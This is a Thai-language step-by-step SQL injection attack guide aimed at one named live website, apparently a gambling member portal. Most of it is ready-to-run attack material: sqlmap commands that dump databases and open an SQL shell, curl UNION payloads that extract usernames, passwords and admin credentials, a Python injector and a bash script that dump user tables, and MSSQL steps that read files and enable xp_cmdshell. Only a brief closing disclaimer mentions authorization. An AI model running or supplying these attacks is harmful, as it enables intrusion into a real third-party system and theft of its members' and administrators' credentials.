# คู่มือการเชื่อมต่อฐานข้อมูลผ่าน SQL Injection

## ข้อมูลช่องโหว่ที่พบ

**Vulnerable Endpoint:** `https://member.panama8888b.com/public/js/v2/app.js?v=`  
**Database Type:** Microsoft SQL Server  
**Injection Type:** Time-based, Boolean-based, UNION-based  

## วิธีการ 1: การใช้ sqlmap (แนะนำ)

### ติดตั้ง sqlmap
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install sqlmap

# หรือ clone จาก GitHub
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
```

### คำสั่งสำหรับทดสอบและเชื่อมต่อ

#### 1. ทดสอบช่องโหว่
```bash
sqlmap -u "https://member.panama8888b.com/public/js/v2/app.js?v=25.1" \
       --batch \
       --level=3 \
       --risk=2 \
       --dbms=mssql \
       --technique=T
```

#### 2. ดึงข้อมูลฐานข้อมูล
```bash
# ดึงชื่อฐานข้อมูล
sqlmap -u "https://member.panama8888b.com/public/js/v2/app.js?v=25.1" \
       --batch \
       --dbs \
       --dbms=mssql

# ดึงรายชื่อตาราง
sqlmap -u "https://member.panama8888b.com/public/js/v2/app.js?v=25.1" \
       --batch \
       --tables \
       -D [database_name] \
       --dbms=mssql

# ดึงโครงสร้างตาราง
sqlmap -u "https://member.panama8888b.com/public/js/v2/app.js?v=25.1" \
       --batch \
       --columns \
       -D [database_name] \
       -T [table_name] \
       --dbms=mssql
```

#### 3. ดึงข้อมูลจากตารางสำคัญ
```bash
# ดึงข้อมูล users/admins (ตัวอย่าง)
sqlmap -u "https://member.panama8888b.com/public/js/v2/app.js?v=25.1" \
       --batch \
       --dump \
       -D [database_name] \
       -T users \
       --dbms=mssql \
       --threads=3

# ดึงข้อมูลเฉพาะ column
sqlmap -u "https://member.panama8888b.com/public/js/v2/app.js?v=25.1" \
       --batch \
       --dump \
       -D [database_name] \
       -T users \
       -C "username,password,email" \
       --dbms=mssql
```

#### 4. เปิด SQL Shell
```bash
sqlmap -u "https://member.panama8888b.com/public/js/v2/app.js?v=25.1" \
       --batch \
       --sql-shell \
       --dbms=mssql
```

## วิธีการ 2: Manual SQL Injection

### ขั้นตอนการทดสอบแบบ Manual

#### 1. ตรวจสอบข้อมูลฐานข้อมูล
```bash
# ดึงชื่อฐานข้อมูล
curl "https://member.panama8888b.com/public/js/v2/app.js?v=25.1%29%29%20UNION%20SELECT%20DB_NAME%28%29%20--"

# ดึง version
curl "https://member.panama8888b.com/public/js/v2/app.js?v=25.1%29%29%20UNION%20SELECT%20%40%40version%20--"

# ดึง user ปัจจุบัน
curl "https://member.panama8888b.com/public/js/v2/app.js?v=25.1%29%29%20UNION%20SELECT%20USER_NAME%28%29%20--"
```

#### 2. ดึงรายชื่อตาราง
```bash
# ดึงชื่อตารางทั้งหมด
curl "https://member.panama8888b.com/public/js/v2/app.js?v=25.1%29%29%20UNION%20SELECT%20name%20FROM%20sysobjects%20WHERE%20xtype%3D%27U%27%20--"

# หรือใช้ INFORMATION_SCHEMA
curl "https://member.panama8888b.com/public/js/v2/app.js?v=25.1%29%29%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables%20--"
```

#### 3. ดึงโครงสร้างตาราง
```bash
# ดึง column names
curl "https://member.panama8888b.com/public/js/v2/app.js?v=25.1%29%29%20UNION%20SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27users%27%20--"
```

#### 4. ดึงข้อมูลจากตาราง
```bash
# ตัวอย่างดึงข้อมูล users
curl "https://member.panama8888b.com/public/js/v2/app.js?v=25.1%29%29%20UNION%20SELECT%20username%2Bchar%2858%29%2Bpassword%20FROM%20users%20--"

# ดึงข้อมูล admin
curl "https://member.panama8888b.com/public/js/v2/app.js?v=25.1%29%29%20UNION%20SELECT%20admin_name%2Bchar%2858%29%2Badmin_password%20FROM%20admins%20--"
```

## วิธีการ 3: การใช้ Python Script

### สร้าง Python Script สำหรับ SQL Injection

```python
#!/usr/bin/env python3
import requests
import urllib.parse
import time

class SQLInjector:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def inject_query(self, payload):
        """Execute SQL injection payload"""
        encoded_payload = urllib.parse.quote(payload)
        url = f"{self.base_url}?v=25.1{encoded_payload}"
        
        try:
            response = self.session.get(url, timeout=30)
            return response.text, response.elapsed.total_seconds()
        except Exception as e:
            return None, 0
    
    def time_based_check(self, delay=5):
        """Time-based SQL injection check"""
        payload = f")) WAITFOR DELAY '0:0:{delay}' --"
        content, elapsed = self.inject_query(payload)
        return elapsed > delay - 1
    
    def extract_data(self, query):
        """Extract data using UNION-based injection"""
        payload = f")) UNION SELECT ({query}) --"
        content, elapsed = self.inject_query(payload)
        return content
    
    def get_database_info(self):
        """Get basic database information"""
        queries = {
            'version': '@@version',
            'database': 'DB_NAME()',
            'user': 'USER_NAME()',
            'server': '@@servername'
        }
        
        results = {}
        for key, query in queries.items():
            try:
                result = self.extract_data(query)
                results[key] = result
                print(f"{key}: {result[:100]}...")
            except Exception as e:
                results[key] = f"Error: {e}"
        
        return results
    
    def get_tables(self):
        """Get table names"""
        query = "SELECT name FROM sysobjects WHERE xtype='U'"
        return self.extract_data(query)
    
    def get_columns(self, table_name):
        """Get column names for a table"""
        query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'"
        return self.extract_data(query)
    
    def dump_table(self, table_name, columns=None, limit=10):
        """Dump data from a table"""
        if columns:
            cols = '+CHAR(58)+'.join(columns)
            query = f"SELECT TOP {limit} {cols} FROM {table_name}"
        else:
            query = f"SELECT TOP {limit} * FROM {table_name}"
        
        return self.extract_data(query)

# การใช้งาน
if __name__ == "__main__":
    injector = SQLInjector("https://member.panama8888b.com/public/js/v2/app.js")
    
    # ทดสอบ time-based injection
    if injector.time_based_check():
        print("[+] Time-based SQL injection confirmed!")
        
        # ดึงข้อมูลฐานข้อมูล
        print("\n[+] Getting database information...")
        db_info = injector.get_database_info()
        
        # ดึงรายชื่อตาราง
        print("\n[+] Getting table names...")
        tables = injector.get_tables()
        print(f"Tables: {tables}")
        
        # ดึงข้อมูลจากตารางสำคัญ
        important_tables = ['users', 'admins', 'members', 'players']
        for table in important_tables:
            print(f"\n[+] Dumping table: {table}")
            data = injector.dump_table(table)
            print(f"Data: {data[:200]}...")
    
    else:
        print("[-] SQL injection not working")
```

## วิธีการ 4: การใช้ Burp Suite

### ขั้นตอนการใช้ Burp Suite

1. **Setup Burp Suite:**
   - เปิด Burp Suite Professional
   - Configure browser proxy (127.0.0.1:8080)

2. **Capture Request:**
   - เข้าไปที่ `https://member.panama8888b.com/public/js/v2/app.js?v=25.1`
   - Capture request ใน Burp

3. **Send to Intruder:**
   - Right-click → Send to Intruder
   - Set payload position ที่ parameter `v`

4. **Configure Payloads:**
   ```
   25.1)) UNION SELECT @@version --
   25.1)) UNION SELECT DB_NAME() --
   25.1)) UNION SELECT name FROM sysobjects WHERE xtype='U' --
   ```

5. **Start Attack และวิเคราะห์ผลลัพธ์**

## คำสั่งที่สำคัญสำหรับ Microsoft SQL Server

### Information Gathering
```sql
-- Database version
SELECT @@version

-- Current database
SELECT DB_NAME()

-- Current user
SELECT USER_NAME()

-- Server name
SELECT @@servername

-- List databases
SELECT name FROM master..sysdatabases

-- List tables
SELECT name FROM sysobjects WHERE xtype='U'

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### Data Extraction
```sql
-- Extract user data
SELECT username, password FROM users

-- Extract admin data  
SELECT admin_name, admin_password FROM admins

-- Extract with concatenation
SELECT username+':'+password FROM users

-- Extract with CHAR to avoid quotes
SELECT username+CHAR(58)+password FROM users
```

### Advanced Techniques
```sql
-- Read files (if permissions allow)
SELECT * FROM OPENROWSET(BULK 'C:\windows\system32\drivers\etc\hosts', SINGLE_CLOB) AS x

-- Execute commands (if xp_cmdshell enabled)
EXEC xp_cmdshell 'dir'

-- Enable xp_cmdshell (if sysadmin)
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

## ตัวอย่างการใช้งานจริง

### Script สำหรับดึงข้อมูล Admin
```bash
#!/bin/bash

BASE_URL="https://member.panama8888b.com/public/js/v2/app.js"

echo "[+] Getting database name..."
curl -s "${BASE_URL}?v=25.1%29%29%20UNION%20SELECT%20DB_NAME%28%29%20--" | head -20

echo -e "\n[+] Getting table names..."
curl -s "${BASE_URL}?v=25.1%29%29%20UNION%20SELECT%20name%20FROM%20sysobjects%20WHERE%20xtype%3D%27U%27%20--" | head -20

echo -e "\n[+] Getting admin data..."
curl -s "${BASE_URL}?v=25.1%29%29%20UNION%20SELECT%20admin_name%2BCHAR%2858%29%2Badmin_password%20FROM%20admins%20--" | head -20

echo -e "\n[+] Getting user data..."
curl -s "${BASE_URL}?v=25.1%29%29%20UNION%20SELECT%20username%2BCHAR%2858%29%2Bpassword%20FROM%20users%20--" | head -20
```

## ข้อควรระวัง

1. **Legal:** ทำการทดสอบเฉพาะระบบที่ได้รับอนุญาตเท่านั้น
2. **Performance:** SQL injection อาจทำให้ระบบช้าลง
3. **Detection:** อาจถูก WAF หรือ IDS ตรวจจับ
4. **Data Integrity:** ระวังไม่ให้ทำลายข้อมูล

## สรุป

ใช้วิธีการข้างต้นเพื่อเชื่อมต่อและดึงข้อมูลจากฐานข้อมูลผ่านช่องโหว่ SQL Injection ที่พบเจอ แนะนำให้ใช้ sqlmap เป็นอันดับแรกเพราะมีความสามารถครบถ้วนและใช้งานง่าย

**หมายเหตุ:** การทดสอบนี้ควรทำในสภาพแวดล้อมที่ควบคุมได้และได้รับอนุญาตเท่านั้น